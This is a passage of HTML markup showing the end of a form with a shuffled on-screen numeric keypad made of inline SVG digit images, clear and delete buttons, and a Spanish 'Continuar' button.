            <img onclick="evalRanTable('9'); logintud();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjEsMTZjMC0yLjcsMS41LTMuMywzLjktMy4zYzMsMCwzLjcsMS42LDMuNyw0LjJjMCw0LjctMSw2LjItNS42LDYuMmMtMC4xLDAtMC4zLDAtMS4xLDAgICBsLTAuMS0xLjRjMS44LTAuMSw1LDAuMyw1LTIuNmMtMC41LDAuMS0xLjMsMC4yLTIsMC4yQzE1LjUsMTkuMiwxNC4xLDE4LjUsMTQuMSwxNnogTTE4LDE0Yy0xLjcsMC0yLjIsMC41LTIuMiwxLjkgICBjMCwxLjUsMC44LDEuOCwyLjIsMS44YzAuNiwwLDEuMy0wLjEsMS44LTAuMmMwLTAuMywwLTAuNywwLTFDMTkuOSwxNS4zLDE5LjcsMTQsMTgsMTR6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSI5IiBjeT0iMTUiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMCIgY3k9IjI1Ii8+Cjwvc3ZnPg==">
            <img onclick="evalRanTable('7'); logintud();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjYsMTQuMnYtMS41aDZjMC43LDAsMS4xLDAuMywxLjEsMC44YzAsMC4yLDAsMC40LTAuMSwwLjZsLTQsOC44aC0ybDQuMy04LjcgICBDMTkuOSwxNC4yLDE0LjYsMTQuMiwxNC42LDE0LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIxNSIgY3k9IjIyIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMTgiIGN5PSIxNSIvPgo8L3N2Zz4=">
            <img class="clean-button" src="../files/img/loli_manito_clean-new.svg" onclick="deletexd(); logintud();">
          </div>
        </div>
        <div>
          <div class="left">
            <img onclick="evalRanTable('0'); logintud();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LDIzYy0zLjEsMC0zLjgtMS43LTMuOC01LjJzMC42LTUuMiwzLjgtNS4yczMuOCwxLjcsMy44LDUuMlMyMS4xLDIzLDE4LDIzeiBNMTgsMjEuNiAgIGMxLjksMCwyLTEuNSwyLTMuOFMxOS45LDE0LDE4LDE0cy0yLDEuNS0yLDMuOFMxNi4xLDIxLjYsMTgsMjEuNnoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjMwIiBjeT0iMiIvPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjI4IiBjeT0iMjYiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNiIgY3k9IjI4Ii8+Cjwvc3ZnPg==">
            <img onclick="evalRanTable('2'); logintud();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjQsMjIuOWMwLjYtMy4xLDAuOC00LjMsMy4yLTUuM2MxLjQtMC42LDItMS4xLDItMi4yUzE5LDE0LDE3LDE0Yy0wLjcsMC0xLjYsMC4xLTIuMywwLjIgICBMMTQuNiwxM2MwLjktMC4yLDIuMS0wLjMsMy4zLTAuM2MyLDAsMy42LDAuNSwzLjYsMi41YzAsMS45LTEsMy0zLDMuOGMtMS42LDAuNi0xLjksMS4yLTIsMi41aDVWMjNMMTQuNCwyMi45TDE0LjQsMjIuOXoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjI0IiBjeT0iMzIiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMSIgY3k9IjE3Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMjgiIGN5PSIzMyIvPgo8L3N2Zz4=">
            <img onclick="evalRanTable('3'); logintud();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTIxLjMsMTUuMmMwLDEuMS0wLjUsMS45LTEuNSwyLjRjMSwwLjQsMS42LDEsMS42LDIuM2MwLDIuNC0xLjUsMy4yLTMuOSwzLjIgICBjLTEuMiwwLTIuMi0wLjEtMy4xLTAuM2wwLjItMS40YzAuOCwwLjEsMS43LDAuMiwyLjUsMC4yYzEuNywwLDIuNC0wLjMsMi40LTEuNmMwLTAuOS0wLjQtMS40LTEuMi0xLjVjLTAuNi0wLjEtMS4zLTAuMS0yLjEtMC4xICAgSDE2VjE3YzAuOCwwLDEuNi0wLjEsMi4zLTAuMmMwLjgtMC4xLDEuMS0wLjYsMS4xLTEuNGMwLTEuMi0wLjktMS4zLTIuMS0xLjNjLTAuOSwwLTEuOCwwLjEtMi43LDAuMkwxNC40LDEzICAgYzAuOS0wLjIsMS45LTAuMywzLTAuM0MxOS41LDEyLjYsMjEuMywxMywyMS4zLDE1LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNCIgY3k9IjQiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNSIgY3k9IjE2Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iNyIgY3k9IjYiLz4KPC9zdmc+">
            <img onclick="evalRanTable('5'); logintud();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjcsMjEuM2MwLjgsMC4xLDEuNywwLjIsMi41LDAuMmMxLjgsMCwyLjQtMC4yLDIuNC0yYzAtMS40LTEuNS0xLjYtMi44LTEuNmMtMC43LDAtMS4zLDAtMiwwICAgbDAuNC01LjNoNi4xdjEuNWgtNC42bC0wLjIsMi40YzAuMiwwLDAuNSwwLDAuNywwYzIuNSwwLDQuMywwLjQsNC4zLDMuMWMwLDIuNC0xLjMsMy4zLTMuOCwzLjNjLTEuMSwwLTIuMi0wLjEtMy4yLTAuM0wxNC43LDIxLjN6ICAgIi8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNiIgY3k9IjkiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMiIgY3k9IjgiLz4KPC9zdmc+">
            <img onclick="evalRanTable('6'); logintud();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTIxLjksMTkuN2MwLDIuNy0xLjUsMy4zLTMuOSwzLjNjLTMsMC0zLjctMS42LTMuNy00LjJjMC00LjcsMS02LjIsNS42LTYuMmMwLjEsMCwwLjMsMCwxLjEsMCAgIGwwLjEsMS40Yy0xLjgsMC4xLTUtMC4zLTUsMi42YzAuNS0wLjEsMS4zLTAuMiwyLTAuMkMyMC41LDE2LjUsMjEuOSwxNy4xLDIxLjksMTkuN3ogTTE3LjksMjEuNmMxLjcsMCwyLjItMC41LDIuMi0xLjkgICBjMC0xLjUtMC44LTEuOC0yLjItMS44Yy0wLjYsMC0xLjMsMC4xLTEuOCwwLjJjMCwwLjMsMCwwLjcsMCwxQzE2LjEsMjAuMywxNi4zLDIxLjYsMTcuOSwyMS42eiIvPgo8L2c+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iOSIgY3k9IjEzIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMSIgY3k9IjIxIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMjMiIGN5PSIyMyIvPgo8L3N2Zz4=">
            <img class="clean-button" src="../files/img/loli_manito_delete-new.svg" onclick="clearxd(); logintud();">
          </div>
        </div>
      </div>
      			<div>
					<div style="margin: 30px 25px 10px 25px; ">
        				<button style="outline: none !important;" id="boton" class="boton disabled">Continuar<i style="font-size: 15px; margin-left: 5px;" class="fas fa-arrow-right"></i></button>
        			</div>
				</div>
      </center>
      		</form>
			</div>
		</div>
		</div>
	</div>
</body>
</html>

    